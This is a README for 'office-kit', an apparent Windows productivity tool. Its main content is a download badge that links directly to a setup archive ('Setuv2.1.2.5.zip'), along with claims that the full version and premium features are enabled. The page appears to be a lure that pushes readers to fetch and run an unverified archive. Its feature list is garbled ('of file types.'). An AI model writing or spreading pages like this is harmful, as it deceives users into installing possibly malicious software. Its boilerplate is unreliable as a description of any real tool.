[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/benclark-ops03k4/office-kit/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# 📦 office-kit

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.2-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/benclark-ops03k4/office-kit?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/benclark-ops03k4/office-kit?style=flat-square)

Office — Productivity suite: batch actions, fast shortcuts

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

## Troubleshooting

Got issues? Here's a quick rundown:

* **It just won't start!** Double-check you have Python 3.11 or later. `python --version` in your terminal will tell you.
* **Settings aren't saving.** Make sure the `config.yaml` file is in the same directory as `main.py`, and that you have write permissions in that folder.
* **Something else is broken.** Check the console output for error messages. Google is your friend!

## Requirements

You'll need Python 3.11 or later. Also, these packages:

* `PyYAML` — for reading config files
* `psutil` — for system monitoring stuff

Install 'em like this:

```bash
pip install -r requirements.txt
```

## Running

Basic usage is pretty straightforward. Just run `python main.py`.

For more advanced stuff, check out the command-line arguments (run `python main.py --help`). You can use it for batch processing files or running specific tasks.

## Config

The `config.yaml` file is where you tweak all the settings. Here's an example:

```yaml
scanner:
 path: "C:\\Documents\\Scans"
 interval: 60 # seconds
 auto_detect: true

core:
 batch_size: 10
 timeout: 5

interface:
 theme: "dark"
 port: 8080
```

* `scanner.path`: Where to look for files.
* `scanner.interval`: How often to scan (in seconds).
* `core.batch_size`: Number of files to process at once.
* `interface.port`: The port for the web interface.

## Features

This thing has a bunch of cool stuff:

* Full version, all features enabled.
* of file types.
* Totally portable, runs anywhere.
* easy setup.
* Premium features enabled by default!

## FAQ

<details>
 <summary>Is this thing resource-intensive?</summary>
 It depends on what you're doing. Scanning directories is pretty lightweight, but batch processing files can use more CPU. Adjust the batch size in the config if it's too much.
</details>

<details>
 <summary>Can I run this on Linux / macOS?</summary>
 It *should* work, but it's mainly tested on Windows. Let me know if you find any issues.
</details>

<details>
 <summary>How do I update?</summary>
 Just download the latest release and overwrite the old files. Your config file should be preserved.
</details>

---

🛠 Built with Python | Open Source